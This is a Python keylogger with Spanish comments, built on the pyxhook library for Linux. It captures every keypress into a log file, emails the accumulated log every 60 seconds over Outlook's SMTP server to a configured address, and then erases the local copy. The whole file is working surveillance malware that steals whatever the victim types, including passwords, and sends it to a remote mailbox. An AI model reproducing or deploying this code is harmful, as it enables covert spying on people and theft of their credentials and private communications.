import pyxhook
import time, datetime
import smtplib


#Fichero donde se van a guardar  las pulsaciones
log_file='/your/route/to/save/the/file/datos.log'

#Esta funcion es llamada cuando se presiona una tecla
def OnKeyPress(event):
	fob=open(log_file,'a')

	if (event.Key == "space"):
		fob.write(" ")
	elif (event.Key == "period"):
		fob.write(".")
	elif (event.Key == "Return"):	#Si das a Enter hace un salto de linea
		fob.write("\n")
	elif (event.Key == "Shift_R" or event.Key == "Shift_L" ):
		fob.write("")
	elif (event.Key == "[65027]"):
		fob.write("[Alt Gr]")
	elif(event.Ascii == 50):		#Codigo arroba, como Alt gr no lo pilla
		fob.write("@")				#hay que capturar por numero ascii, no .Key
	elif(event.Ascii == 51):
		fob.write("#")
	elif (event.Ascii == 52):
		fob.write("~")
	elif (event.Key == "colon"):
		fob.write(":")
	elif (event.Key == "semicolon"):
		fob.write(';')
	elif (event.Key == "comma"):
		fob.write(',')
	elif (event.Key == "slash"):
		fob.write('/')
	elif (event.Key == "underscore"):
		fob.write('_')
	elif (event.Key == "Tab"):
		fob.write('[Tab]		')
	elif (event.Key == "ntilde"):
		fob.write('ny')
	elif (event.Key == "plus"):
		fob.write('*')
	elif (event.Key == "BackSpace"):
		fob.write('[Borrar]')
	elif (event.Key =="ampersand"):
		fob.write('&')
	elif (event.Key == "parenleft"):
		fob.write('(')
	elif (event.Key == "parenright"):
		fob.write(')')
	elif (event.Key == "equal"):
		fob.write('=')
	elif (event.Key == "quotedbl"):
		fob.write('"')
	elif (event.Key == "exclam"):
		fob.write('!')
	elif (event.Key == "question"):
		fob.write('?')
	elif (event.Key =="Down"):
		fob.write('[Down]')
	elif (event.Key =="Left"):
		fob.write('[Left]')
	elif (event.Key =="Right"):
		fob.write('[Right]')
	elif (event.Key =="Up"):
		fob.write('[Up]')

	else:
		fob.write(event.Key)

	#print ("letra presionada: "+event.Key+' codigo ascii: ')
	#print (event.Ascii)

	if (event.Ascii==90): #90 es el valor ascii de (Z)
		fob.close()
		new_hook.cancel()


def TimeOut():
	if time.time() > timeout:
		return True
	else:
		return False


def SendEmail(user, pwd, recipient, subject, body):

	gmail_user = user
	gmail_pass = pwd
	FROM = user
	TO = recipient if type(recipient) is list else [recipient]  #Validamos si es a mas de una persona quien enviamos el correo
	SUBJECT = subject
	TEXT = body

	message = """\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (FROM, ", ".join(TO), SUBJECT, TEXT)
	try:
		server = smtplib.SMTP("smtp-mail.outlook.com", 587)
		server.ehlo()
		server.starttls()
		server.login(gmail_user, gmail_pass)
		server.sendmail(FROM, TO, message)
		server.close()
		print 'Correo enviado satisfactoriamente'
	except:
		print 'Error al mandar correo!'


def FormatAndSendLogEmail():
	with open(log_file, 'r+') as f:
		actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
		data = f.read().replace('\n','')
		data = 'Log capturado a las: '+actualdate+ '\n' + data
		SendEmail('youremail@...', 'password', 'youremail@...', 'Nuevo log - '+actualdate, data)
		f.seek(0)		#0 para apuntar al principio del fichero
		f.truncate()	#Trunca el fichero ( borra todo lo que hay)


wait_seconds =60;
timeout = time.time() + wait_seconds


#Instancia la clase hookManager
new_hook=pyxhook.HookManager()

#Escucha a todas las pulsaciones
new_hook.KeyDown=OnKeyPress

#Vigila elementos del teclado
new_hook.HookKeyboard()

#Empieza la sesion
new_hook.start()

while True:
	if TimeOut():
		FormatAndSendLogEmail()
		timeout = time.time() + wait_seconds #Tiempo limite en segundos, lo igualamos al tiempo actual mas los segundos a esperar


